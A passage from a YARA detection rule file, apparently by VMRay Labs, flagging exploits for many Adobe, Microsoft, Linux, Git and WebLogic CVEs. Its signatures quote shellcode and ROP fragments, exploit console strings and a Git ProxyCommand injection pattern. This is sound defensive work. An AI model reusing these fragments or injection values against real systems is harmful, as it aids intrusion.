38}\n\n    condition:\n        mime_type == \"application/pdf\" and all of them\n}\n\nrule CVE_2009_4324\n{\n    meta:\n        description = \"Exploit for CVE-2009-4324 (Adobe Doc.media.newPlayer Use After Free Vulnerability)\"\n        ref = \"https://blog.talosintelligence.com/2009/12/adobe-reader-medianewplayer-analysis.html\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2009-4324\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        // \"The bug is contained in the doc.media object and is triggered when\n        // sending a null argument to the newPlayer() method\n        $s = \"media.newPlayer(null)\" fullword\n\n    condition:\n        analysis_id == \"pdf\" and mime_type == \"text/javascript\"\n        and $s\n}\n\nrule MSF_adobe_libtiff\n{\n    meta:\n        description = \"Metasploit adobe_libtiff exploit for CVE-2010-0188\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2010-0188\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        // base64-encoded part of the exploit TIFF file\n        $s = \"UAEDAMwAAACSIAAAAAAAAAAMDAgkAQEA\"\n\n    condition:\n        analysis_id == \"pdf\" and $s\n}\n\nrule MSF_CVE_2010_1297_ROP_code\n{\n    meta:\n        description = \"ROP stack code found in Metasploit PDF exploits (CVE-2010-1297, CVE-2010-3654)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2010-1297\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s = \"%ud731%u0700%u15bb%u0700%u905a%u9054%u154d%u0700%ua722%u0700%u15bb%u0700%ueb5a%u5815\"\n\n    condition:\n        analysis_id == \"pdf\" and mime_type == \"text/javascript\"\n        and $s\n}\n\nprivate rule _is_ttf\n{\n    meta:\n        description = \"Matches TrueType font files\"\n        author = \"VMRay Labs\"\n\n    strings:\n        // some font table tags that seem pretty unique\n        $t1 = \"cmap\"\n        $t2 = \"hhea\"\n        $t3 = \"hmtx\"\n\n    condition:\n        uint32be(0) == 0x00010000\n        and for all of ($t*) : (\n            @ % 16 == 12\n        )\n}\n\nrule CVE_2010_2883\n{\n    meta:\n        description = \"Exploit for CVE-2010-2883 (Adobe CoolType SING Table 'uniqueName' Stack Buffer Overflow)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2010-2883\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $sing = \"SING\"\n\n    condition:\n        /*\n            see Metasploit module: exploits/windows/browser/adobe_cooltype_sing\n\n            According to the spec, the SING uniqueName is a zero-terminated\n            string of at most 27 chars. So we detect this exploit by checking\n            if all 28 uniqueName bytes are non-zero.\n\n            '$sing' looks for the SING table tag.\n            'uint32be(@sing+8)' is the offset to the SING table.\n            'uint32be(@sing+8)+16' is the offset to the unique name.\n        */\n\n        _is_ttf\n        and for all i in ((uint32be(@sing+8)+16)..(uint32be(@sing+8)+16 + 28)) : (\n            uint8(i) != 0\n        )\n}\n\nprivate rule _is_u3d\n{\n    meta:\n        description = \"Matches U3D files\"\n        author = \"VMRay Labs\"\n\n    condition:\n        uint32(0) == 0x0443355\n}\n\nrule U3D_in_PDF\n{\n    meta:\n        description = \"U3D file in PDF; possible exploit (CVE-2009-3953, CVE-2011-2462)\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"VMRay Labs\"\n\n    condition:\n        analysis_id == \"pdf\" and _is_u3d\n}\n\nrule MSF_CVE_2011_2462_ROP_code\n{\n    meta:\n        description = \"ROP stack code found in Metasploit PDF exploits (CVE-2010-2883, CVE-2011_2462)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2011_2462\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s = \"%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80\"\n\n    condition:\n        analysis_id == \"pdf\" and mime_type == \"text/javascript\"\n        and $s\n}\n\nrule CVE_2013_0074\n{\n    meta:\n        description = \"Exploit for CVE-2013-0074 (Microsoft Silverlight ScriptObject Unsafe Memory Access)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2013-0074\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"cve_2013_0074\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $b2 = \"Can't find Payload() address\" ascii wide\n        $b3 = \"/SilverApp1;component/App.xaml\" ascii wide\n        $b4 = \"Can't allocate ums after buf[]\" ascii wide\n        $b5 = \"------------ START ------------\"\n\n    condition:\n        ((2 of ($b*)))\n}\n\nrule CVE_2013_0422\n{\n    meta:\n        description = \"Exploit for CVE-2013-0422 (Java Applet JMX Remote Code Execution)\"\n        ref = \"http://pastebin.com/JVedyrCe\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2013-0422\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"adnan.shukor@gmail.com\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"CVE_2013_0422\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $0422_1 = \"com/sun/jmx/mbeanserver/JmxMBeanServer\" fullword\n        $0422_2 = \"com/sun/jmx/mbeanserver/JmxMBeanServerBuilder\" fullword\n        $0422_3 = \"com/sun/jmx/mbeanserver/MBeanInstantiator\" fullword\n        $0422_4 = \"findClass\" fullword\n        $0422_5 = \"publicLookup\" fullword\n        $class = /sun\\.org\\.mozilla\\.javascript\\.internal\\.(Context|GeneratedClassLoader)/ fullword\n\n    condition:\n        (all of ($0422_*)) or (all of them)\n}\n\nrule CVE_2013_2551\n{\n    meta:\n        description = \"Exploit for CVE-2013-2551 (MSIE COALineDashStyleArray Integer Overflow)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2013-2551\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/ctxis/CAPE\"\n        original_name = \"CVE_2013_2551\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"dashstyle.array.length\" ascii nocase wide\n        $s1 = \"#default#VML\" ascii nocase wide\n        $s2 = /dashstyle\\.array\\.length[\\r\\n\\s]*=[\\r\\n\\s]*[^\\x3b]*-/ ascii nocase wide\n\n    condition:\n        all of ($s*)\n}\n\nrule MSF_adobe_toolbutton\n{\n    meta:\n        description = \"Metasploit adobe_toolbutton exploit for CVE-2013-3346\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2013-3346\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"function heapSpray\" fullword\n        $s2 = \"var shellcode\" fullword\n        $s3 = \"app.addToolButton\" fullword\n        $s4 = \"cEnable\" fullword\n        $s5 = \"app.removeToolButton\" fullword\n\n    condition:\n        analysis_id == \"pdf\" and mime_type == \"text/javascript\"\n        and all of them\n}\n\nrule Possible_CVE_2013_3346\n{\n    meta:\n        description = \"Possible exploit for CVE-2013-3346 (Adobe Reader ToolButton Use After Free)\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"app.addToolButton\" fullword\n        $s2 = \"cEnable\" fullword\n        $s3 = \"app.removeToolButton\" fullword\n\n    condition:\n        analysis_id == \"pdf\" and mime_type == \"text/javascript\"\n        and not MSF_adobe_toolbutton\n        and all of them\n}\n\nrule CVE_2014_0514\n{\n    meta:\n        description = \"Exploit for CVE-2014-0514 (Adobe Reader for Android addJavascriptInterface Exploit)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2014-0514\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"android.os.Process\" fullword\n        $s2 = \"java.lang.Runtime\" fullword\n        $s3 = \"exec\" fullword\n\n    condition:\n        analysis_id == \"pdf\" and mime_type == \"text/javascript\"\n        and 2 of them\n}\n\nrule CVE_2014_0515\n{\n    meta:\n        description = \"Exploit for CVE-2014-0515 (Adobe Flash Player Shader Buffer Overflow)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2014-0515\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/ctxis/CAPE\"\n        original_name = \"CVE_2014_0515\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = {00 43 72 79 73 74 61 6C 6C 69 7A 65 A0 0C 6E 61 6D 65 73 70 61 63 65}\n        $cvalloc = {00 A2 07 64 65 66 61 75 6C 74 56 61 6C 75 65 00}\n\n    condition:\n        $s1 and for any i in (1 .. #cvalloc) : (uint32(@cvalloc[i] + 0x14) > 2000000000)\n}\n\nrule Exploit_CVE_2014_0569\n{\n    meta:\n        description = \"Exploit for CVE-2014-0569 (Adobe Flash Player casi32 Integer Overflow)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2014-0569\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/ctxis/CAPE\"\n        original_name = \"Exploit_CVE_2014_0569\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $fwshdr = \"FWS\" ascii\n        $s1 = \"pawn2c\" ascii nocase fullword\n        $s2 = {25 80 20 25 fe 07 2d 05 41 03 25 fe 07}\n        $s3 = \"casi32\" ascii nocase fullword\n        $s4 = \"atomicCompareAndSwapLength\" ascii nocase fullword\n\n    condition:\n        for any i in (1 .. #fwshdr) : (for all of ($s*) : ($ in (@fwshdr[i] .. @fwshdr[i] + uint32(@fwshdr[i] + 0x4) + 8)) and uint16(@fwshdr[i] + uint32(@fwshdr[i] + 0x4) + 6) == 0x0000)\n}\n\nrule CVE_2014_4076_Exploitcode\n{\n    meta:\n        description = \"Exploit for CVE-2014-4076 (Windows tcpip!SetAddrOptions NULL Pointer Dereference)\"\n        ref = \"https://github.com/Neo23x0/yarGen\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2014-4076\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CVE_2014_4076_Exploitcode\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"[+] Created a new cmd.exe process\" fullword ascii\n        $x2 = \"[+] Modified shellcode\" fullword ascii\n        $x3 = \"[*] Spawning SYSTEM shell...\" fullword ascii\n        $x4 = \"[*] MS14-070 (CVE-2014-4076) x86\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule Exploit_CVE_2014_6332\n{\n    meta:\n        description = \"Exploit for CVE-2014-6332 (MSIE Windows OLE Automation Array Remote Code Execution)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2014-6332\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/ctxis/CAPE\"\n        original_name = \"Exploit_CVE_2014_6332\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $m1s1 = \"chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)\" ascii wide nocase\n        $m1s2 = \"chrw(32767)\" ascii wide nocase\n        $m2s1 = \"(0)=&h6C64746E&\" nocase ascii wide\n        $m2s2 = \"%uC789%uC783%u891A%u66FE%u84AD%u74E4%uFE0C%uFECC%uC0C8%u04E0%uE008%uEBAA%u90EE\" nocase ascii wide\n        $m2s3 = \"redim\" nocase ascii wide\n        $m2s4 = \"Preserve\" nocase ascii wide\n        $m3s1 = \"chrw(2176)\" nocase ascii wide\n        $m3s2 = \"chrw(32767)\" nocase ascii wide\n        $m3s3 = \"redim\" nocase ascii wide\n        $m3s4 = \"Preserve\" nocase ascii wide\n        $m4s1 = {18 00 00 00 01 00 80 08 01 00 00 00 00 00 00 00 00 00 00 00 FF FF FF 7F 00 00 00 00}\n        $m4s2 = \"redim\" nocase ascii wide fullword\n        $m4s3 = \"preserve\" nocase ascii wide fullword\n        $m4s4 = \"vbscript\" nocase ascii wide\n\n    condition:\n        all of ($m1*) or all of ($m2*) or all of ($m3*) or all of ($m4*)\n}\n\nrule CVE_2015_0016_M1\n{\n    meta:\n        description = \"Exploit for CVE-2015-0016 (Microsoft Remote Desktop Services Web Proxy IE Sandbox Escape)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2015-0016\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/ctxis/CAPE\"\n        original_name = \"CVE_2015_0016_M1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"MSTSWebProxy.MSTSWebProxy\" nocase ascii wide\n        $s2 = \".StartRemoteDesktop\" nocase ascii wide\n        $s3 = \"Scripting.FileSystemObject\" nocase ascii wide\n        $s4 = \"CreateObject\" nocase ascii wide\n        $vb1 = /language\\s*=\\s*[\\x22\\x27]?vbscript/ nocase ascii wide\n        $vb2 = \"text/vbscript\" nocase ascii wide\n\n    condition:\n        all of ($s*) and any of ($vb*)\n}\n\nrule CVE_2015_1674_CNGSYS\n{\n    meta:\n        description = \"Exploit for CVE-2015-1674 (Windows Kernel Security Feature Bypass Vulnerability)\"\n        ref = \"http://www.binvul.com/viewthread.php?tid=508\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2015-1674\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CVE_2015_1674_CNGSYS\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\Device\\\\CNG\" fullword wide\n        $s2 = \"GetProcAddress\" fullword ascii\n        $s3 = \"LoadLibrary\" ascii\n        $s4 = \"KERNEL32.dll\" fullword ascii\n        $s5 = \"ntdll.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 60KB and all of them\n}\n\nrule CVE_2015_1701_Taihou\n{\n    meta:\n        description = \"Exploit for CVE-2015-1701 (Windows ClientCopyImage Win32k Exploit)\"\n        ref = \"http://goo.gl/W4nU0q\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2015-1701\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"CVE_2015_1701_Taihou\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s3 = \"VirtualProtect\" fullword\n        $s4 = \"RegisterClass\"\n        $s5 = \"LoadIcon\"\n        $s6 = \"PsLookupProcessByProcessId\" fullword ascii\n        $s7 = \"LoadLibraryExA\" fullword ascii\n        $s8 = \"gSharedInfo\" fullword\n        $w1 = \"user32.dll\" wide\n        $w2 = \"ntdll\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 160KB and all of ($s*) and 1 of ($w*)\n}\n\nrule Exploit_CVE_2015_2419\n{\n    meta:\n        description = \"Exploit for CVE-2015-2419 (Jscript9 Memory Corruption Vulnerability)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2015-2419\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/ctxis/CAPE\"\n        original_name = \"Exploit_CVE_2015_2419\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"MOV [ECX+0C],EAX\" nocase ascii wide\n        $s2 = \"\\\"lIll\\\":\\\"kernel32\" nocase ascii wide\n        $s3 = \"\\\"lIlll\\\":\\\"virtualprotect\" nocase ascii wide\n        $s4 = \"prototype\" nocase ascii wide\n        $s5 = \"stringify\" nocase ascii wide\n\n    condition:\n        all of ($s*)\n}\n\nrule Exploit_MS15_077_078\n{\n    meta:\n        description = \"Exploit for CVE-2015-2426 (Microsoft Windows Font Driver Buffer Overflow)\"\n        ref = \"https://code.google.com/p/google-security-research/issues/detail?id=473&can=1&start=200\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2015-2426\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Exploit_MS15_077_078\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"GDI32.DLL\" fullword ascii\n        $s2 = \"atmfd.dll\" fullword wide\n        $s3 = \"AddFontMemResourceEx\" fullword ascii\n        $s4 = \"NamedEscape\" fullword ascii\n        $s5 = \"CreateBitmap\" fullword ascii\n        $s6 = \"DeleteObject\" fullword ascii\n\n        $n1 = \"CreatePolygonRgn\" fullword\n        $n2 = \"CreateRoundRectRgn\" fullword\n        \n        $op0 = { 83 45 e8 01 eb 07 c7 45 e8 }\n        $op1 = { 8d 85 24 42 fb ff 89 04 24 e8 80 22 00 00 c7 45 }\n        $op2 = { eb 54 8b 15 6c 00 4c 00 8d 85 24 42 fb ff 89 44 }\n        $op3 = { 64 00 88 ff 84 03 70 03 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and\n        (\n            3 of ($op*)\n            or\n            (\n                5 of ($s*) and not any of ($n*)\n            )\n        )\n}\n\nrule Exploit_MS15_077_078_HackingTeam\n{\n    meta:\n        description = \"Exploit for CVE-2015-2426 (Microsoft Windows Font Driver Buffer Overflow); Hacking Team code\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2015-2426\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Exploit_MS15_077_078_HackingTeam\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\SystemRoot\\\\system32\\\\CI.dll\" fullword ascii\n        $s2 = \"\\\\sysnative\\\\CI.dll\" fullword ascii\n        $s3 = \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36\" fullword ascii\n        $s4 = \"CRTDLL.DLL\" fullword ascii\n        $s5 = \"\\\\sysnative\" fullword ascii\n        $s6 = \"InternetOpenA coolio, trying open %s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2500KB and 5 of them\n}\n\nrule CVE_2015_2545\n{\n    meta:\n        description = \"Exploit for CVE-2015-2545 (Microsoft Office Malformed EPS File Vulnerability)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2015-2545\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Exp_EPS_CVE20152545\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"word/media/image1.eps\" ascii\n        $s2 = \"-la;7(la+\" ascii\n\n    condition:\n        uint16(0) == 0x4b50 and ($s1 and #s2 > 20)\n}\n\nrule Exploit_HT_CVE_2015_5122\n{\n    meta:\n        description = \"Exploit for CVE-2015-5122 (Adobe Flash opaqueBackground Use After Free)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2015-5122\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/ctxis/CAPE\"\n        original_name = \"Exploit_HT_CVE_2015_5122\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $fwshdr = \"FWS\" ascii\n        $s1 = \"FindVP\" ascii fullword\n        $s2 = \"CopyBAToVector\" ascii fullword\n        $s3 = \"Payload\" ascii fullword\n        $s4 = \"TryExpl\" ascii fullword\n\n    condition:\n        for any i in (1 .. #fwshdr) : (for all of ($s*) : ($ in (@fwshdr[i] .. @fwshdr[i] + uint32(@fwshdr[i] + 0x4) + 8)) and uint16(@fwshdr[i] + uint32(@fwshdr[i] + 0x4) + 6) == 0x0000)\n}\n\nrule CVE_2016_0189_Generic\n{\n    meta:\n        description = \"Exploit for CVE-2016-0189 (MSIE VBScript Engine Memory Corruption)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2016-0189\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/ctxis/CAPE\"\n        original_name = \"CVE_2016_0189_Generic\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"leakMem\" fullword ascii wide nocase\n        $t1_1 = \"%u0008%u4141%u4141%u4141\" ascii wide nocase\n        $t1_2 = \"%25u0008%25u4141%25u4141%25u4141\" ascii wide nocase\n        $t2_1 = \"ReDim Preserve\" ascii wide nocase\n        $t2_2 = \"ReDim%20Preserve\" ascii wide nocase\n        $t3_1 = \"(1, 2000)\" ascii wide nocase\n        $t3_2 = \"%281%2c%202000%29\" ascii wide nocase\n        $t4_1 = \"1, 24000)\" ascii wide nocase\n        $t4_2 = \"%281%2c%202000%29\" ascii wide nocase\n\n    condition:\n        all of ($s*) and any of ($t1_*) and any of ($t2_*) and any of ($t3_*) and any of ($t4_*)\n}\n\nrule CVE_2016_3298_Mem\n{\n    meta:\n        description = \"Exploit for CVE-2016-3298 (MSIE Information Disclosure Vulnerability)\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2016-3298\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/ctxis/CAPE\"\n        original_name = \"CVE_2016_3298_Mem\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $res1 = \"res://\" nocase ascii wide\n        $res2 = /res\\x3a\\x2f\\x2f([a-z]\\x3a\\x5c+)?Progra[^\\x22\\x27\\x00-\\x1f#\\x3b]*\\.(dll|exe)\\x2f+#(24|16|11)\\x2f/ ascii nocase wide\n        $mhres = \"mhtml:res:/\" nocase ascii wide\n        $mf1 = \"mhtml:file:/\" nocase ascii wide\n        $mf2 = /mhtml\\x3afile\\x3a\\x2f([a-z]\\x3a\\x5c|progra)/ ascii wide nocase\n\n    condition:\n        $res1 and #res2 > 3 or all of ($mf*) or $mhres\n}\n\nrule Linux_DirtyCow_Exploit\n{\n    meta:\n        description = \"Exploit for CVE-2016-5195 (Dirty COW)\"\n        ref = \"http://dirtycow.ninja/\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2016-5195\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Linux_DirtyCow_Exploit\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = { 48 89 D6 41 B9 00 00 00 00 41 89 C0 B9 02 00 00 00 BA 01 00 00 00 BF 00 00 00 00 }\n        $b1 = { E8 ?? FC FF FF 48 8B 45 E8 BE 00 00 00 00 48 89 C7 E8 ?? FC FF FF 48 8B 45 F0 BE 00 00 00 00 48 89 }\n        $b2 = { E8 ?? FC FF FF B8 00 00 00 00 }\n        $source1 = \"madvise(map,100,MADV_DONTNEED);\"\n        $source2 = \"=open(\\\"/proc/self/mem\\\",O_RDWR);\"\n        $source3 = \",map,SEEK_SET);\"\n        $source_printf1 = \"mmap %x\"\n        $source_printf2 = \"procselfmem %d\"\n        $source_printf3 = \"madvise %d\"\n        $source_printf4 = \"[-] failed to patch payload\"\n        $source_printf5 = \"[-] failed to win race condition...\"\n        $source_printf6 = \"[*] waiting for reverse connect shell...\"\n        $s1 = \"/proc/self/mem\"\n        $s2 = \"/proc/%d/mem\"\n        $s3 = \"/proc/self/map\"\n        $s4 = \"/proc/%d/map\"\n        $p1 = \"pthread_create\" fullword ascii\n        $p2 = \"pthread_join\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and $a1) or all of ($b*) or 3 of ($source*) or (uint16(0) == 0x457f and 1 of ($s*) and all of ($p*) and filesize < 20KB)\n}\n\nrule CVE_2017_1000117_poc\n{\n    meta:\n        description = \"Exploit for CVE-2017-1000117 (Git Remote Command Injection Vulnerability)\"\n        ref = \"https://twitter.com/mzbat/status/895811803325898753\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2017-1000117\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"git_CVE_2017_9800_poc\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"git clone ssh://-oProxyCommand=\" ascii\n        $s2 = \"git clone http://-\" ascii\n        $s3 = \"git clone https://-\" ascii\n\n    condition:\n        filesize < 200KB and 1 of them\n}\n\nrule gen_exploit_CVE_2017_10271_WebLogic\n{\n    meta:\n        description = \"Exploit for CVE-2017-10271 (Oracle WebLogic wls-wsat Component Deserialization RCE)\"\n        ref = \"https://github.com/c0mmand3rOpSec/CVE-2017-10271, https://www.fireeye.com/blog/threat-research/2018/02/cve-2017-10271-used-to-deliver-cryptominers.html\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2017-10271\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"John Lambert @JohnLaTwC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"gen_exploit_CVE_2017_10271_WebLogic\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<soapenv:Header\"\n        $s2 = \"java.beans.XMLDecoder\"\n        $s3 = \"void\" fullword\n        $s4 = \"index=\"\n        $s5 = \"/array>\"\n        $s6 = \"\\\"start\\\"\"\n        $s7 = \"work:WorkContext\" nocase\n\n    condition:\n        filesize < 10KB and (uint32(0) == 0x616f733c or uint32(0) == 0x54534f50) and all of ($s*)\n}\n\nrule rtf_cve2017_11882_ole : malicious exploit cve_2017_11882\n{\n    meta:\n        description = \"Exploit for CVE-2017-11882 (Microsoft Office Memory Corruption Vulnerability)\"\n        ref = \"https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2017-11882\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"John 